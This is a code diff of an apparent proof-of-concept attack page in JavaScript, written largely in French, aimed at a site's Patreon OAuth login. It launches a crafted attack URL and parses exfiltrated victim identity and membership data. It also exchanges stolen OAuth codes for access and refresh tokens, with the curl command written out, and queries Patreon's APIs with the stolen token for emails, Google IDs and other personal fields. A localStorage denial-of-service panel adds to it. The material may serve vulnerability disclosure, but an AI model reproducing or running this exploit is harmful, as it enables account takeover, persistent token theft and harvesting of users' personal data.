-    '  [6] Code redirected to attacker domain (open redirect)\n' +
-    '  [7] Attacker exchanges code for access_token + refresh_token\n' +
-    '  [8] Permanent Patreon API access (infinite via refresh)\n\n' +
-    'Total impact: identity theft + persistent DoS + OAuth token theft',
-    'error'
-  );
+function addSeparator(container) {
+  var sep = document.createElement('div');
+  sep.setAttribute('style', 'border-bottom:2px solid #30363d;margin:8px 0;');
+  container.appendChild(sep);
+}
+
+function setDot(id, color) {
+  document.getElementById(id).className = 'dot dot-' + color;
+}
+
+function launchAttack() {
+  var url = buildAttackUrl();
+  document.getElementById('attack-url').textContent = url;
+  setDot('dot-exfil', 'green');
+  setDot('dot-dos', 'green');
+  setDot('dot-phish', 'yellow');
   window.open(url, '_blank');
 }
 
-// ===== OAuth Token Tester =====
+function copyUrl() {
+  var url = buildAttackUrl();
+  document.getElementById('attack-url').textContent = url;
+  navigator.clipboard.writeText(url);
+}
 
-function testPatreonAPI() {
-  var token = document.getElementById('stolen-token').value.trim();
-  if (!token) { setOutput('api-output', 'Please paste an access_token first.', 'error'); return; }
-  setOutput('api-output', 'Fetching Patreon API v2 /identity ...', 'waiting');
+function parseResults() {
+  var raw = document.getElementById('raw-data').value.trim();
+  if (!raw) return;
 
-  fetch('https://www.patreon.com/api/oauth2/v2/identity?include=memberships,memberships.campaign&fields[user]=email,full_name,image_url,created,vanity&fields[member]=patron_status,currently_entitled_amount_cents,campaign_lifetime_support_cents&fields[campaign]=creation_name', {
-    headers: { 'Authorization': 'Bearer ' + token }
+  var data;
+  try { data = JSON.parse(raw); } catch(e) {
+    try { data = JSON.parse(decodeURIComponent(raw)); } catch(e2) {
+      var el = document.getElementById('identity-data');
+      el.textContent = '';
+      addRow(el, 'Erreur', 'JSON invalide. Collez le contenu du parametre "d" decode.');
+      document.getElementById('parsed-results').style.display = 'block';
+      return;
+    }
+  }
+
+  document.getElementById('parsed-results').style.display = 'block';
+  setDot('dot-exfil', 'green');
+
+  var idBox = document.getElementById('identity-data');
+  var memBox = document.getElementById('membership-data');
+  var korBox = document.getElementById('korben-data');
+  idBox.textContent = '';
+  memBox.textContent = '';
+  korBox.textContent = '';
+
+  if (data.korben_patreon_auth) {
+    try {
+      var auth = typeof data.korben_patreon_auth === 'string' ? JSON.parse(data.korben_patreon_auth) : data.korben_patreon_auth;
+      if (auth.email) addRow(idBox, 'Email', auth.email, true);
+      if (auth.fullName) addRow(idBox, 'Nom complet', auth.fullName, true);
+      if (auth.patreonId) addRow(idBox, 'Patreon ID', auth.patreonId, true);
+      if (auth.imageUrl) addRow(idBox, 'Photo de profil', auth.imageUrl, true);
+      if (auth.tier) addRow(idBox, 'Tier', auth.tier);
+      if (auth.isActivePatron !== undefined) addRow(idBox, 'Patron actif', auth.isActivePatron ? 'OUI' : 'NON');
+
+      if (auth.memberships && auth.memberships.length) {
+        auth.memberships.forEach(function(m) {
+          addRow(memBox, 'Campagne', m.campaignName || m.campaign || 'N/A');
+          if (m.patronStatus) addRow(memBox, 'Statut', m.patronStatus);
+          if (m.currentlyEntitledAmountCents) addRow(memBox, 'Montant', (m.currentlyEntitledAmountCents / 100) + ' EUR');
+          addSeparator(memBox);
+        });
+      }
+    } catch(e) {
+      addRow(idBox, 'Raw', JSON.stringify(data.korben_patreon_auth).substring(0, 500), true);
+    }
+  }
+
+  Object.keys(data).forEach(function(key) {
+    if (key === 'korben_patreon_auth') return;
+    var val = data[key];
+    if (typeof val === 'object') val = JSON.stringify(val);
+    if (typeof val === 'string' && val.length > 200) val = val.substring(0, 200) + '...';
+    addRow(korBox, key, val);
+  });
+
+  if (!idBox.hasChildNodes()) addRow(idBox, '', 'Aucune donnee Patreon trouvee');
+  if (!memBox.hasChildNodes()) addRow(memBox, '', 'Aucun abonnement');
+  if (!korBox.hasChildNodes()) addRow(korBox, '', 'Aucune autre donnee');
+}
+
+function exchangeCode() {
+  var code = document.getElementById('oauth-code').value.trim();
+  if (!code) return;
+
+  document.getElementById('curl-cmd').textContent =
+    'curl -X POST \\\n  https://patreon-oauth-korben.korben.workers.dev/token \\\n  -H "Content-Type: application/json" \\\n  -d \'{"code":"' + code + '"}\'';
+
+  setDot('dot-oauth', 'green');
+
+  fetch('https://patreon-oauth-korben.korben.workers.dev/token', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ code: code })
   })
   .then(function(r) { return r.json(); })
   .then(function(data) {
-    setOutput('api-output', 'Patreon API v2 Response:\n\n' + JSON.stringify(data, null, 2));
+    document.getElementById('token-results').style.display = 'block';
+    var box = document.getElementById('token-data');
+    box.textContent = '';
+    if (data.token) {
+      addRow(box, 'access_token', data.token, true);
+      addRow(box, 'refresh_token', data.refresh_token || 'N/A', true);
+      addRow(box, 'expires_in', (data.expires_in || 0) + ' sec (' + Math.round((data.expires_in || 0) / 86400) + ' jours)');
+      addRow(box, 'scopes', 'identity, identity[email], identity.memberships');
+      setDot('dot-token', 'green');
+      document.getElementById('access-token').value = data.token;
+    } else {
+      addRow(box, 'Reponse', JSON.stringify(data));
+    }
   })
   .catch(function(e) {
-    setOutput('api-output', 'Error: ' + e.message + '\n\nNote: CORS may block browser requests. Use curl:\ncurl -H "Authorization: Bearer ' + token + '" https://www.patreon.com/api/oauth2/v2/identity', 'error');
+    document.getElementById('token-results').style.display = 'block';
+    var box = document.getElementById('token-data');
+    box.textContent = '';
+    addRow(box, 'Erreur navigateur', 'CORS bloque depuis le navigateur');
+    addRow(box, 'Solution', 'Executez la commande curl ci-dessus dans un terminal');
+    setDot('dot-oauth', 'yellow');
   });
 }
 
-function testPatreonV1() {
-  var token = document.getElementById('stolen-token').value.trim();
-  if (!token) { setOutput('api-output', 'Please paste an access_token first.', 'error'); return; }
-  setOutput('api-output', 'Fetching Patreon API v1 /current_user ...', 'waiting');
+function callAPI(version) {
+  var token = document.getElementById('access-token').value.trim();
+  if (!token) return;
 
-  fetch('https://www.patreon.com/api/oauth2/api/current_user', {
-    headers: { 'Authorization': 'Bearer ' + token }
-  })
+  document.getElementById('api-results').style.display = 'block';
+  var box = document.getElementById('api-data');
+  box.textContent = 'Chargement...';
+  box.style.color = '#e3b341';
+
+  var url = version === 'v1'
+    ? 'https://www.patreon.com/api/oauth2/api/current_user'
+    : 'https://www.patreon.com/api/oauth2/v2/identity?include=memberships,memberships.campaign&fields[user]=email,full_name,image_url,created,vanity&fields[member]=patron_status,currently_entitled_amount_cents&fields[campaign]=creation_name';
+
+  fetch(url, { headers: { 'Authorization': 'Bearer ' + token } })
   .then(function(r) { return r.json(); })
   .then(function(data) {
-    setOutput('api-output', 'Patreon API v1 Response (exposes more data: google_id, has_password, gender):\n\n' + JSON.stringify(data, null, 2));
+    box.textContent = '';
+    box.style.color = '';
+    if (version === 'v2' && data.data && data.data.attributes) {
+      var a = data.data.attributes;
+      addRow(box, 'Email', a.email || 'N/A', true);
+      addRow(box, 'Nom', a.full_name || 'N/A', true);
+      addRow(box, 'Cree le', a.created || 'N/A');
+      addRow(box, 'Vanity', a.vanity || 'N/A');
+      if (data.included) {
+        addSeparator(box);
+        data.included.forEach(function(inc) {
+          if (inc.type === 'member') {
+            addRow(box, 'Statut membre', inc.attributes.patron_status || 'N/A');
+            addRow(box, 'Montant', ((inc.attributes.currently_entitled_amount_cents || 0) / 100) + ' EUR');
+          }
+          if (inc.type === 'campaign') addRow(box, 'Campagne', inc.attributes.creation_name || 'N/A');
+        });
+      }
+    } else if (version === 'v1' && data.data && data.data.attributes) {
+      var a = data.data.attributes;
+      addRow(box, 'Email', a.email || 'N/A', true);
+      addRow(box, 'Nom', a.full_name || a.first_name || 'N/A', true);
+      addRow(box, 'Google ID', a.google_id || 'N/A', true);
+      addRow(box, 'has_password', String(a.has_password), true);
+      addRow(box, 'Gender', String(a.gender));
+      addRow(box, 'Apple ID', String(a.apple_id || 'null'));
+      addRow(box, 'Facebook ID', String(a.facebook_id || 'null'));
+      addRow(box, 'Discord ID', String(a.discord_id || 'null'));
+      addRow(box, 'Email verifie', String(a.is_email_verified));
+      addRow(box, 'Supprime', String(a.is_deleted));
+      addRow(box, 'Suspendu', String(a.is_suspended));
+    } else {
+      box.textContent = JSON.stringify(data, null, 2);
+      box.style.color = '#79c0ff';
+    }
   })
   .catch(function(e) {
-    setOutput('api-output', 'Error: ' + e.message + '\n\nNote: CORS may block browser requests. Use curl:\ncurl -H "Authorization: Bearer ' + token + '" https://www.patreon.com/api/oauth2/api/current_user', 'error');
+    box.textContent = '';
+    box.style.color = '';
+    addRow(box, 'Erreur', e.message);
+    addRow(box, 'Note', 'CORS peut bloquer. Utilisez curl avec -H "Authorization: Bearer TOKEN"');
   });
 }
+
+// Init
+document.getElementById('attack-url').textContent = buildAttackUrl();
+document.getElementById('curl-cmd').textContent =
+  '# Commande curl pour echanger le code :\ncurl -X POST \\\n  https://patreon-oauth-korben.korben.workers.dev/token \\\n  -H "Content-Type: application/json" \\\n  -d \'{"code":"VOTRE_CODE"}\'';
+
+// DoS info
+(function() {
+  var box = document.getElementById('dos-info');
+  addRow(box, 'Patreon deconnecte', 'OUI - localStorage vide', true);
+  addRow(box, 'Reconnexion possible', 'NON - quota sature (~5-10MB)', true);
+  addRow(box, 'Survit au restart', 'OUI - localStorage persistant', true);
+  addRow(box, 'Fix pour la victime', 'DevTools > Application > Clear Storage');
+  addRow(box, 'Gestion d\'erreur', 'AUCUNE - pas de try/catch sur setItem', true);
+})();
 </script>
 
 </body>
